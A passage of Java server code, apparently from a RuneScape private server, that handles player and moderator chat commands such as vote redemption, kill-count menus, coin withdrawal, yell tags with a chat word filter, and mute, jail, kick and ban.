			// c.getPA().sendFrame126("@blu@14. Farming Loyalty = 24h IPJail.",8158);
			// c.getPA().sendFrame126("@blu@15. Threatening the server won't be taken
			// lightly.",8159);
		}
		if (playerCommand.startsWith("redeem")) {
			String auth = playerCommand.replace("redeem ", "");

			try {
				boolean success = motivote.redeemVote(auth);

				if (success) {
					c.getItems().addItem(6183, 1);
					c.sendMessage("Auth redeemed, thanks for voting!");
				} else {
					c.sendMessage("Invalid auth supplied, please try again later.");
				}
			} catch (Exception ex) {
				ex.printStackTrace();
				c.sendMessage("Unable to check auth, please try again later.");
			}
		}
		if (playerCommand.equalsIgnoreCase("npclog")) {
			for (int i = 8144; i < 8195; i++) {
				c.getPA().sendFrame126("", i);
			}
			c.getPA().showInterface(8134);
			c.getPA().sendFrame126("@red@NPC Stats", 8144);
			c.getPA().sendFrame126("Total NPCs Killed - @dre@" + c.npcKills, 8145);
			c.getPA().sendFrame126("Total Bosses Killed - @dre@" + c.bossesKilled, 8147);
			c.getPA().sendFrame126("Total Slayer Tasks Completed - @dre@" + c.tasksCompleted, 8148);
			c.getPA().sendFrame126("", 8149);
			c.getPA().sendFrame126("Dagganoth Kings Killed - @dre@" + c.daggsKilled, 8150);
			c.getPA().sendFrame126("Tormented Demons Killed - @dre@" + c.demonsKilled, 8151);
			c.getPA().sendFrame126("King Black Dragons Killed - @dre@" + c.kbdKilled, 8152);
			c.getPA().sendFrame126("Nexs Killed - @dre@" + c.nexKilled, 8153);
			c.getPA().sendFrame126("Nomads Killed - @dre@" + c.nomadKilled, 8154);
			c.getPA().sendFrame126("Corporal Beasts Killed - @dre@" + c.corpKilled, 8155);
			c.getPA().sendFrame126("Chaos Elemental Killed - @dre@" + c.chaosKilled, 8156);
			c.getPA().sendFrame126("Barrelchest Killed - @dre@" + c.barrelKilled, 8157);
			c.getPA().sendFrame126("Avatar of Destruction Killed - @dre@" + c.avatarKilled, 8158);
			c.getPA().sendFrame126("Glacors Killed - @dre@" + c.glacorKilled, 8159);
			c.getPA().sendFrame126("Frost Dragons Killed - @dre@" + c.frostsKilled, 8160);
			c.getPA().sendFrame126("Godwar Bosses Killed - @dre@" + c.godwarKilled, 8161);
			c.getPA().sendFrame126("Jads Killed - @dre@" + c.jadKilled, 8162);
			c.getPA().sendFrame126("Mithril Dragons Killed - @dre@" + c.mithKilled, 8163);

			c.getPA().sendFrame126("Power-Ps Beast Killed - @dre@" + c.VesBeastKilled, 8164);
			c.getPA().sendFrame126("Power-Ps Protector Killed - @dre@" + c.ProtectorKilled, 8165);
			c.getPA().sendFrame126("Power-Ps Wrecker Killed - @dre@" + c.WreckerKilled, 8166);
			c.getPA().sendFrame126("Giant mole Killed - @dre@" + c.GiantMoleKilled, 8167);
			c.getPA().sendFrame126("Kalphite Queen Killed - @dre@" + c.KalQueenKilled, 8168);
			c.getPA().sendFrame126("Mithril Dragons Killed - @dre@" + c.mithKilled, 8169);
			c.getPA().sendFrame126("Forgotten Warrior Killed - @dre@" + c.ForgottenWarriorKilled, 8170);
			c.getPA().sendFrame126("Mad Mummy Killed - @dre@" + c.MadMummyKilled, 8171);
			c.getPA().sendFrame126("Cloud Killed - @dre@" + c.BlueTorvaKilled, 8172);
			c.getPA().sendFrame126("Toxic Torva Killed - @dre@" + c.FlameTorvaKilled, 8173);

			c.getPA().sendFrame126("Mcdonalds Torva Killed - @dre@" + c.Torva24KKilled, 8174);
			c.getPA().sendFrame126("Candy Torva Killed - @dre@" + c.PredatorTorvaKilled, 8175);
			c.getPA().sendFrame126("Viking Torva Killed - @dre@" + c.BurstTorvaKilled, 8176);
			c.getPA().sendFrame126("Crimson Torva Killed - @dre@" + c.CyrexTorvaKilled, 8177);
		}
		if (playerCommand.startsWith("commands")) { // change name to whatever,

			for (int i = 8144; i < 8199; i++) {
				c.getPA().sendFrame126("", i);
			}
			c.getPA().showInterface(8134);
			c.getPA().sendFrame126("Power-Ps Commands", 8144);
			c.getPA().sendFrame126("@red@Misc", 8148);
			c.getPA().sendFrame126("1- ::npclog", 8149);
			c.getPA().sendFrame126("4- ::starterguide", 8150);
			c.getPA().sendFrame126("8- ::Altar", 8151);
			c.getPA().sendFrame126("9- ::Shops", 8152);
			c.getPA().sendFrame126("12- ::Starterboost", 8153);
			c.getPA().sendFrame126("13- ::Claim", 8154);

			c.getPA().sendFrame126("@red@Teleports", 8156);
			c.getPA().sendFrame126("13- ::Corp", 8157);
			c.getPA().sendFrame126("13- ::Dzone", 8158);
			c.getPA().sendFrame126("13- ::Train", 8159);
			c.getPA().sendFrame126("13- ::Wings", 8160);
			c.getPA().sendFrame126("13- ::Protector", 8161);
			c.getPA().sendFrame126("13- ::Customs", 8162);
			c.getPA().sendFrame126("13- ::Dicezone", 8163);
			c.getPA().sendFrame126("14- ::Torvazone", 8164);
			c.getPA().sendFrame126("15- ::Ares", 8165);
			c.getPA().sendFrame126("16- ::Tetsu", 8166);
			c.getPA().sendFrame126("17- ::Whitetorva *new zone", 8167);
			c.getPA().sendFrame126("18- ::Aiyana", 8168);
			c.getPA().sendFrame126("19- ::Beastmasters", 8169);
			c.getPA().sendFrame126("20- ::Drygore", 8170);
			c.getPA().sendFrame126("21- ::420Torva", 8171);
			c.getPA().sendFrame126("22- ::Spidermantorva superdonators", 8172);
			c.getPA().sendFrame126("23- ::BloodTorva Superdonator Zone", 8173);
			c.getPA().sendFrame126("24- ::Americantorva", 8174);
			c.getPA().sendFrame126("25- ::Valgor Superdonator Zone", 8175);
			c.getPA().sendFrame126("26- ::Asg", 8176);
			c.getPA().sendFrame126("27- ::presents", 8177);
			c.getPA().sendFrame126("28- ::wbtorva Superdonator zone", 8178);
			c.getPA().sendFrame126("29- ::chill", 8179);
			c.getPA().sendFrame126("30- ::cinemas", 8180);
			c.getPA().sendFrame126("32- ::dragonbone", 8181);
			c.getPA().sendFrame126("33- ::imperial superdonators", 8182);
			c.getPA().sendFrame126("34- ::dumblas", 8183);
			c.getPA().sendFrame126("35- ::nicetorva", 8184);
			c.getPA().sendFrame126("36- ::chaseblade Superdonor zone", 8185);
			c.getPA().sendFrame126("37- ::torvazone2", 8186);
			c.getPA().sendFrame126("38- ::Power *new", 8187);
			c.getPA().sendFrame126("39- ::weapons *new", 8188);
			c.getPA().sendFrame126("40- ::key *new", 8189);
			c.getPA().sendFrame126("41- ::sponsorzone", 8190);
			c.getPA().sendFrame126("42- ::lootbox", 8191);
			c.getPA().sendFrame126("43- ::hellacious - new boss", 8192);
			c.getPA().sendFrame126("44- ::settag - Donor+", 8193);
			c.getPA().sendFrame126("45- ::1bgreedyzone", 8194);
			c.getPA().sendFrame126("46- ::2bgreedyzone", 8195);
			c.getPA().sendFrame126("47- ::1mhpboss - new boss", 8196);
			c.getPA().sendFrame126("48- ::nkminigame - new minigame", 8197);
			c.getPA().sendFrame126("49- ::nknpc - new npc", 8198);
			c.getPA().sendFrame126("49- ::christmas - new npc", 8199);
		}
		if (playerCommand.startsWith("commands2")) { // change name to whatever,

			for (int i = 8144; i < 8199; i++) {
				c.getPA().sendFrame126("", i);
			}
			c.getPA().showInterface(8134);
			c.getPA().sendFrame126("@cya@Power-Ps Commands 2", 8144);
			c.getPA().sendFrame126("1 - ::1mhpboss - new boss", 8145);
			c.getPA().sendFrame126("2 - ::nkminigame - new minigame", 8146);
			c.getPA().sendFrame126("3 - ::nknpc - new npc", 8147);
			c.getPA().sendFrame126("4 - ::christmas - new npc", 8148);
			c.getPA().sendFrame126("5 - ::mbox - new npc", 8149);
		}
		if (playerCommand.startsWith("withdraw")) {
			String[] cAmount = playerCommand.split(" ");
			int amount = Integer.parseInt(cAmount[1]);
			if (c.inWild()) {
				c.sendMessage("You cannot do this in the wilderness");
				c.getPA().sendFrame126("" + c.MoneyCash + "", 8135);
				return;
			}
			if (amount < 1) {
				return;
			}
			if (amount == 0) {
				c.sendMessage("Why would I withdraw no coins?");
				return;
			}
			if (c.MoneyCash == 0) {
				c.sendMessage("You don't have any cash in the bag.");
				c.getPA().sendFrame126("" + c.MoneyCash + "", 8135);
				return;
			}
			if (c.MoneyCash < amount) {
				if (amount == 1) {
					c.sendMessage("You withdraw 1 coin.");
				} else {
					c.sendMessage("You withdraw " + c.MoneyCash + " coins.");
				}
				c.getItems().addItem(995, c.MoneyCash);
				c.MoneyCash = 0;
				c.getPA().sendFrame126("" + c.MoneyCash + "", 8134);
				c.getPA().sendFrame126("" + c.MoneyCash + "", 8135);
				return;
			}
			if (c.MoneyCash != 0) {
				if (amount == 1) {
					c.sendMessage("You withdraw 1 coin.");
				} else {
					c.sendMessage("You withdraw " + amount + " coins.");
				}
				c.MoneyCash -= amount;
				c.getItems().addItem(995, amount);
				c.getPA().sendFrame126("" + c.MoneyCash + "", 8135);
				if (c.MoneyCash > 99999 && c.MoneyCash <= 999999) {
					c.getPA().sendFrame126("" + c.MoneyCash / 1000 + "K", 8134);
				} else if (c.MoneyCash > 999999 && c.MoneyCash <= 2147483647) {
					c.getPA().sendFrame126("" + c.MoneyCash / 1000000 + "M", 8134);
				} else {
					c.getPA().sendFrame126("" + c.MoneyCash + "", 8134);
				}
				c.getPA().sendFrame126("" + c.MoneyCash + "", 8135);
			}
		}
		if (playerCommand.startsWith("resettask")) {
			c.taskAmount = -1;
			c.slayerTask = 0;
		}
		if (playerCommand.startsWith("resetdef")) {
			if (c.inWild())
				return;
			for (int j = 0; j < c.playerEquipment.length; j++) {
				if (c.playerEquipment[j] > 0) {
					c.sendMessage("Please take all your armour and weapons off before using this command.");
					return;
				}
			}
			try {
				int skill = 1;
				int level = 1;
				c.playerXP[skill] = c.getPA().getXPForLevel(level) + 5;
				c.playerLevel[skill] = c.getPA().getLevelForXP(c.playerXP[skill]);
				c.getPA().refreshSkill(skill);
			} catch (Exception e) {
			}
		}
		if (playerCommand.equalsIgnoreCase("enddung")) {
			if (c.InDung() || c.inDungBossRoom()) {
				c.getPA().movePlayer(3085, 3495, 0);
				c.playerLevel[5] = c.getPA().getLevelForXP(c.playerXP[5]);
				c.playerLevel[3] = c.getPA().getLevelForXP(c.playerXP[3]);
				c.prayerId = -1;
				c.hasFollower = 0;
				c.isSkulled = true;
				c.getPA().closeAllWindows();
				c.getPA().refreshSkill(5);
				c.getPA().refreshSkill(3);
				c.getItems().deleteAllItems();
				c.hasChoosenDung = false;
				c.getDungeoneering().setDaBooleans();
				// c.hassentrelogmessage = false;
				c.needstorelog = true;
				c.InDung = false;
				c.getPA().closeAllWindows();
			} else {
				c.sendMessage("YOU ARE NOT IN DUNGEONEERING!");
				return;
			}
		}
		if (playerCommand.equalsIgnoreCase("damage")) {
			c.sendMessage("Damage dealt : " + c.barbDamage + " ");
		}

		if (playerCommand.equalsIgnoreCase("endgame")) {
			if (c.inBarbDef) {
				Server.barbDefence.endGame(c, false);
			} else {
				c.sendMessage("Your not in the minigame!");
			}
		}
		if (playerCommand.startsWith("rest")) {
			c.startAnimation(5713);
		}

		if (playerCommand.equalsIgnoreCase("bank") && c.issDonator == 1 && !c.inWild() && !c.isInPbox() && !c.pkSafe()
				&& !c.isInArd() && !c.isInFala() && !c.inFunPk()) {
			c.getPA().openUpBank();
		}
		if (playerCommand.equalsIgnoreCase("bank") && c.issDonator == 1 && !c.inWild() && !c.isInPbox() && !c.pkSafe()
				&& !c.isInArd() && !c.isInFala() && !c.inFunPk()) {
			c.getPA().openUpBank();
		}
		if (playerCommand.startsWith("claim")) {
			c.rspsdata(c, c.playerName);
		}
		if (playerCommand.equalsIgnoreCase("players")) {
			c.getPA().showInterface(19350);
			c.getPA().refreshPlayersInterface();
		}
		/*
		 * if (playerCommand.equalsIgnoreCase("players")) {
		 * c.sendMessage("There are currently " + PlayerHandler.getPlayerCount() +
		 * " players online."); c.getPA().sendFrame126(Config.SERVER_NAME +
		 * " - Online Players", 8144); c.getPA().sendFrame126( "@dbl@Online players(" +
		 * PlayerHandler.getPlayerCount() + "):", 8145); int line = 8147; for (int i =
		 * 1; i < Config.MAX_PLAYERS; i++) { Client p = c.getClient(i); if
		 * (!c.validClient(i)) continue; if (p.playerName != null) { String title = "";
		 * if (p.playerRights == 1) { title = "Mod, "; } else if (p.playerRights == 2) {
		 * title = "Admin, "; } else if (p.playerRights == 6) { title = "Sponsor, "; }
		 * else if (p.playerRights == 3) { title = "Owner, "; } else if (p.playerRights
		 * == 4) { title = "Donator, "; } title += "level-" + p.combatLevel; String
		 * extra = ""; if (c.playerRights > 0) { extra = "(" + p.playerId + ") "; }
		 * c.getPA().sendFrame126( "@dre@" + extra + p.playerName + "@dbl@ (" + title +
		 * ") @dre@Kills: @dbl@ " + p.KC + ",  @dre@Deaths: @dbl@" + p.DC, line);
		 * line++; } } c.getPA().showInterface(8134); c.flushOutStream(); }
		 */
		if (playerCommand.startsWith("changepassword") && playerCommand.length() > 15) {
			// c.playerPass = playerCommand.substring(15);
			c.playerPass = Misc.getFilteredInput(playerCommand.substring(15));
			c.sendMessage("Your password is now: " + c.playerPass);
		}
		/*
		 * if (playerCommand.startsWith("claim")) { if (c.buryDelay >= 2) {
		 * c.sendMessage("Error, Try Again.."); } else { if (c.checkVotes(c.playerName))
		 * { c.getItems().addItem(989, 1); c.customPoints += 50; c.pcPoints += 100;
		 * c.votingPoints += 1; c.buryDelay = System.currentTimeMillis(); c.sendMessage(
		 * "Thanks for voting, You Received 50 Custom & 100 Power-Ps Points & 1 Voting Point."
		 * ); c.sendMessage("You may vote again in 12 hours."); } else {
		 * c.sendMessage("You have not voted yet today."); return; } }
		 * 
		 * }
		 */

		if (playerCommand.startsWith("food") && (c.isDonator == 1)) {
			if (c.buryDelay >= 120) {
				c.sendMessage("You cannot do this yet, try again in 2 minutes.");
			} else {
				c.getItems().addItem(391, 10);
				c.buryDelay = System.currentTimeMillis();
			}
		}

		if (playerCommand.startsWith("ep") || playerCommand.startsWith("Ep") || playerCommand.startsWith("EP")
				|| playerCommand.startsWith("eP")) {
			c.sendMessage("EP: " + c.earningPotential + "");
		} // add player spawning here
		if (playerCommand.startsWith("donationn") || playerCommand.startsWith("donationn")
				|| playerCommand.startsWith("Donationn") || playerCommand.startsWith("Donation")) {
			c.getPA().sendFrame126("Power-ps donate shop coming soon", 11000);// Power-ps donate shop coing soon

		}
		if (playerCommand.startsWith("settag") && (c.isDonator >= 1)) {
			if (c.isDonator < 1) {
				c.sendMessage("Only special donators may use this feature.");
				return;
			}
			String tag = playerCommand.substring(7);
			if (tag.length() < 1 || tag.length() > 12) {
				c.sendMessage("Yell tag must be 1-12 characters long!");
				return;
			}
			String[] blocked = { "owner", "mod", "moderator", "admin" };
			for (int i = 0; i < blocked.length; i++) {
				if (tag.toLowerCase().contains(blocked[i])) {
					c.sendMessage("Tag Blocked: Abuse = Ban");
					return;
				}
			}
			c.customYellTag = playerCommand.substring(7);
			c.sendMessage("You changed your YellTag to: " + c.customYellTag);
			return;
		}
		if (playerCommand.startsWith("skull"))
			if (c.skullTimer > 0) {
				c.skullTimer--;
				if (c.skullTimer == 1) {
					c.isSkulled = false;
					c.attackedPlayers.clear();
					c.headIconPk = -1;
					c.skullTimer = -1;
					c.getPA().requestUpdates();
				}
			}

		if (playerCommand.startsWith("yell") || playerCommand.equalsIgnoreCase("Yell")
				|| playerCommand.equalsIgnoreCase("YELL") || playerCommand.equalsIgnoreCase("yel")) {
			String text = playerCommand.substring(5);
			String[] bad = { "chalreq", "duelreq", "tradereq", ". com", "org", "net", "biz", ". net", ". org", ". biz",
					". no-ip", "- ip", ".no-ip.biz", "no-ip.org", "servegame", ".com", ".net", ".org", "no-ip", "****",
					"<", "is gay", "****", "crap", "rubbish", "com", "serve", "no-ip", "net", "biz", "Icon-ps",
					"dreamscape", "All join", ".weebly.com", "weebly.com", "DREAMSCAPE", "icon-ps", "i c o n - p s",
					"fuck", "asshole", "your gay", "suck a dick", "dick", "pussy", "DICK", "Pussy", "Fuck", "Asshole" };
			for (int i = 0; i < bad.length; i++) {
				if (text.indexOf(bad[i]) >= 0) {
					c.sendMessage("This word has been Blocked Sorry sir");
					return;
				}
			}
			for (int j = 0; j < Server.playerHandler.players.length; j++) {
				if (Server.playerHandler.players[j] != null) {
					Client c2 = (Client) Server.playerHandler.players[j];

					if (!Connection.isMuted(c)) {
						if (c.npcKills < 50) {
							c.sendMessage("You need atleast 50 NPC Kills before you can yell");
							return;
						}

						if (c.playerName.equalsIgnoreCase("Melee200100") && c.playerRights == 3) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=800000000>[Developer]"
									+ Misc.optimizeText(c.playerName) + ":</shad> "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerName.equalsIgnoreCase("Seth")) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=800000000>[Main-Owner] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerName.equalsIgnoreCase("Harryl")) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=800000000>[Developer] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerName.equalsIgnoreCase("")) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=800000000>[Owner] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerName.equalsIgnoreCase("Black Man")) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=200000000>[Head of Staff] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 10) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=99999999>[TrustedDicer] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 7) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=52984>[Helper] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 8) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=16014601>[Youtuber] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 9) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=16014601>[Media manager] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 6) {
							c2.sendMessage("[<shad=20451204>" + c.customYellTag + "</shad>]<shad=20451204>[Sponsor] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 2) {
							c2.sendMessage("[<col=9505557>" + c.npcKills
									+ "</col>]<shad=200000000>[Administrator]</col>" + Misc.optimizeText(c.playerName)
									+ "</shad>: " + Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 1) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<shad=12406447>[Moderator]</col>"
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 0) {
							c2.sendMessage("[<col=9505557>" + c.npcKills + "</col>]<col=12543>[Player]</col>"
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 4 && c.isDonator == 1) {
							c2.sendMessage("[<shad=255>" + c.customYellTag + "</shad>]<shad=255>[Donator] "
									+ Misc.optimizeText(c.playerName) + "</shad>: "
									+ Misc.optimizeText(playerCommand.substring(5)) + "");
						} else if (c.playerRights == 5 && c.issDonator == 1) {
							c2.sendMessage("[<shad=15692059>" + c.customYellTag
									+ "</shad>]<shad=15692059>[Super Donator] " + Misc.optimizeText(c.playerName)
									+ "</shad>: " + Misc.optimizeText(playerCommand.substring(5)) + "");
						}
					} else if (c.isInJail()) {
						c.sendMessage("You cannot yell while you are in Jail!");
						return;
					}

				}
			}
		}
	}

	public void moderatorCommands(Client c, String playerCommand) {
		if (playerCommand.equalsIgnoreCase("server")) {
			for (int i = 8144; i < 8195; i++) {
				c.getPA().sendFrame126("", i);
			}
			c.getPA().sendFrame126("@dre@Server Commands", 8144);
			c.getPA().sendFrame126("", 8145);
			// c.getPA().sendFrame126("@blu@::togglehs<col=0> - Toggles
			// Highscores[Currently: "+Config.HIGHSCORES_ENABLED+"]", 8147);
			c.getPA().sendFrame126(
					"@blu@::toggleduel@bla@ - Toggles Duel Arena[Currently: " + Config.DUEL_ENABLED + "]", 8147);
			c.getPA().sendFrame126("@blu@::togglestake@bla@ - Toggles Staking[Currently: " + Config.STAKE_ENABLED + "]",
					8148);
			c.getPA().sendFrame126(
					"@blu@::toggletrade@bla@ - Toggles Trading[Currently: " + Config.TRADING_ENABLED + "]", 8149);
			c.getPA().sendFrame126("@blu@::toggleshops@bla@ - Toggles Shops[Currently: " + Config.SHOPS_ENABLED + "]",
					8150);
			// c.getPA().sendFrame126("@blu@::togglegambling<col=0> - Toggles
			// Gambling[Currently: "+Config.GAMBLING_ENABLED+"]", 8152);
			c.getPA().sendFrame126("@blu@::reloadshops@bla@ - Reloads Shops.", 8151);
			c.getPA().sendFrame126("@blu@::reloadnpcs@bla@ - Reloads NPC Spawns.", 8152);
			c.getPA().sendFrame126("@blu@::reloadobjects@bla@ - Reloads Objects.", 8153);
			c.getPA().showInterface(8134);
		}

		if (playerCommand.equals("toggletrade")) {
			Config.TRADING_ENABLED = !Config.TRADING_ENABLED;
			c.sendMessage("Trading is now " + (Config.TRADING_ENABLED ? "enabled." : "disabled."));
			c.getPA().sendFrame126(
					"@blu@::toggletrade@bla@ - Toggles Trading[Currently: " + Config.TRADING_ENABLED + "]", 8150);
		}

		if (playerCommand.equals("toggleduel")) {
			Config.DUEL_ENABLED = !Config.DUEL_ENABLED;
			c.sendMessage("Dueling is now " + (Config.TRADING_ENABLED ? "enabled." : "disabled."));
			c.getPA().sendFrame126(
					"@blu@::toggleduel@bla@ - Toggles Duel Arena[Currently: " + Config.DUEL_ENABLED + "]", 8148);
		}

		if (playerCommand.equals("togglestake")) {
			Config.STAKE_ENABLED = !Config.STAKE_ENABLED;
			c.sendMessage("Staking is now " + (Config.TRADING_ENABLED ? "enabled." : "disabled."));
			c.getPA().sendFrame126("@blu@::togglestake@bla@ - Toggles Staking[Currently: " + Config.STAKE_ENABLED + "]",
					8149);
		}

		if (playerCommand.equals("toggleshops")) {
			Config.SHOPS_ENABLED = !Config.SHOPS_ENABLED;
			c.sendMessage("Shops are now " + (Config.TRADING_ENABLED ? "enabled." : "disabled."));
			c.getPA().sendFrame126("@blu@::toggleshops@bla@ - Toggles Shops[Currently: " + Config.SHOPS_ENABLED + "]",
					8151);
		}

		if (playerCommand.equals("reloadobjects")) {
			for (int i = 0; i < PlayerHandler.players.length; i++) {
				Server.objectManager.loadObjects((Client) PlayerHandler.players[i]);
			}
			for (int z = 0; z < Server.playerHandler.players.length; z++) {
				/*
				 * if (Server.playerHandler.players[z] != null) { Client o = (Client)
				 * Server.playerHandler.players[z];
				 * o.sendMessage("<col=800000000>Objects has just been reloaded by " +
				 * Misc.optimizeText(c.playerName) + "."); }
				 */
			}
		}

		if (playerCommand.equals("reloadnpcs") && (c.playerRights == 3)) {
			for (int i = 0; i < Server.npcHandler.maxNPCs; i++) {
				Server.npcHandler.npcs[i] = null;
			}
			for (int i = 0; i < Server.npcHandler.maxListedNPCs; i++) {
				Server.npcHandler.NpcList[i] = null;
			}
			Server.npcHandler.loadNPCList("./Data/CFG/npc.cfg");
			Server.npcHandler.loadAutoSpawn("./Data/CFG/spawn-config.cfg");
			c.sendMessage("NPCs reloaded.");
		}

		if (playerCommand.startsWith("reloadshops")) {
			Server.shopHandler = new server.world.ShopHandler();
			c.sendMessage("Shops reloaded!");
		}
		if (playerCommand.startsWith("load")) {
			String loadData = playerCommand.substring(5);
			switch (loadData) {
			case "npcs":
			case "Npcs":
				Server.npcHandler = new server.model.npcs.NPCHandler();
				c.sendMessage("Npcs reloaded.");
				break;
			case "drops":
			case "Drops":
				Server.npcDrops = new server.model.npcs.NPCDrops();
				c.sendMessage("Drops reloaded.");
				break;
			case "shops":
			case "Shops":
				Server.shopHandler = new server.world.ShopHandler();
				c.sendMessage("Shops reloaded.");
				break;
			case "items":
			case "Items":
				Server.itemHandler = new server.world.ItemHandler();
				c.sendMessage("Items reloaded.");
				break;
			}
		}
		if (playerCommand.startsWith("timedmute") && c.playerRights >= 1 && c.playerRights <= 3) {

			try {
				String[] args = playerCommand.split("-");
				if (args.length < 2) {
					c.sendMessage("Currect usage: ::timedmute-playername-time");
					return;
				}
				String playerToMute = args[1];
				int muteTimer = Integer.parseInt(args[2]) * 60000;

				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToMute)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("You have been muted by: " + c.playerName + " for " + muteTimer / 60000
									+ " minutes");
							c2.muteEnd = System.currentTimeMillis() + muteTimer;
							break;
						}
					}
				}

			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("jail")) {
			try {
				String playerToBan = playerCommand.substring(5);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.teleportToX = 2338;
							c2.teleportToY = 4747;
							c2.Jail = true;
							c2.sendMessage("You have been jailed by " + c.playerName + "");
							c.sendMessage("Successfully Jailed " + c2.playerName + ".");
							for (int z = 0; z < Server.playerHandler.players.length; z++) {
								if (Server.playerHandler.players[z] != null) {
									Client o = (Client) Server.playerHandler.players[z];
									o.sendMessage("<col=29184>[" + Misc.optimizeText(c2.playerName)
											+ "]</col> <col=800000000>has just been jailed by "
											+ Misc.optimizeText(c.playerName) + ".");
								}
							}
						}
					}
				}

			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("xteleto") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			String name = playerCommand.substring(8);
			for (int i = 0; i < Config.MAX_PLAYERS; i++) {
				if (Server.playerHandler.players[i] != null) {
					if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(name)) {
						c.getPA().movePlayer(Server.playerHandler.players[i].getX(),
								Server.playerHandler.players[i].getY(), Server.playerHandler.players[i].heightLevel);
					}
				}
			}
		}
		if (playerCommand.equalsIgnoreCase("save") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			for (final Player p : PlayerHandler.players) {
				if (p == null) {
					continue;
				}
				PlayerSave.saveGame((Client) p);
			}
			System.out.println("Saved game for all players.");
			c.sendMessage("<shad=800000000>Saved game for all players.");
			for (int z = 0; z < Server.playerHandler.players.length; z++) {
				if (Server.playerHandler.players[z] != null) {
					Client o = (Client) Server.playerHandler.players[z];
					o.sendMessage("<col=800000000>[" + Misc.optimizeText(c.playerName) + "] - Saved all accounts.");
				}
			}
		}
		if (playerCommand.startsWith("mute") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			try {
				String playerToBan = playerCommand.substring(5);
				Connection.addNameToMuteList(playerToBan);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("You have been muted by: " + c.playerName);
							c.sendMessage("You have muted: " + c2.playerName);
							for (int z = 0; z < Server.playerHandler.players.length; z++) {
								if (Server.playerHandler.players[z] != null) {
									Client o = (Client) Server.playerHandler.players[z];
									o.sendMessage("<col=29184>[" + Misc.optimizeText(c2.playerName)
											+ "]</col> <col=800000000>has just been muted by "
											+ Misc.optimizeText(c.playerName) + ".");
								}
							}
							break;
						}
					}
				}
				if (playerCommand.startsWith("fixinv")) {
					c.sendMessage("You have disconnected to fix your inventory");
					c.disconnected = true;
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}

		if (playerCommand.startsWith("unmute")) {
			try {
				String playerToBan = playerCommand.substring(7);
				Connection.unMuteUser(playerToBan);
				c.sendMessage("Unmuted.");
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("kick") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			try {
				String playerToBan = playerCommand.substring(5);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Server.playerHandler.players[i].disconnected = true;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("ban") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			try {
				String playerToBan = playerCommand.substring(4);
				Connection.addNameToBanList(playerToBan);
				Connection.addNameToFile(playerToBan);
				c.getPA().writeBanLog(playerCommand);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Server.playerHandler.players[i].disconnected = true;
